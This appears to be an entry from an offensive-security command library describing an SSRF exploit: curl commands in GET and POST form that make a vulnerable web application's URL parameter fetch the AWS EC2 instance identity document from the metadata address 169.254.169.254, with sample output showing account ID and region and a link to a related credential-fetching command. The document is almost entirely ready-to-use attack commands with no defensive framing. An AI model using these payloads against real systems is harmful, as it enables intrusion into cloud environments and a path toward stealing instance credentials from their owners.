---
id: b3451fe6-ed94-4f59-9269-57e1ba7c48f3
name: curl-fetch-instance-identity-document
type: command
executor: bash
data: >-
  curl
  "http://target-app.com/api/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"
  -v
output: null
created_at: '2023-04-06T03:56:38.274099+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - aws
  - metadata
verified: true
validated: true
---

# curl-fetch-instance-identity-document

## Command

```bash
curl "http://target-app.com/api/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document" -v
```

## Description

This command exploits an SSRF vulnerability to fetch the AWS EC2 instance identity document via a vulnerable web application's URL parameter. It is used in cloud environments to retrieve instance details like account ID and region without direct access to the metadata service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target-app.com/api/fetch` | Vulnerable endpoint URL | Yes |
| `url=http://169.254.169.254/latest/dynamic/instance-identity/document` | Metadata URL injected into SSRF parameter | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl "http://target-app.com/api/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document" -v
```

### Advanced Usage

```bash
curl -X POST "http://target-app.com/api/fetch" -d "url=http://169.254.169.254/latest/dynamic/instance-identity/document" -v
```

## Expected Output

The proxied JSON response from the metadata service:
```json
{
  "accountId": "123456789012",
  "instanceId": "i-1234567890abcdef0",
  "region": "us-east-1"
}
```

## Related

- [[procedures/Exploit-SSRF-for-AWS-Cloud-Instance-Metadata-Access]]
- [[commands/curl-fetch-iam-security-credentials]]
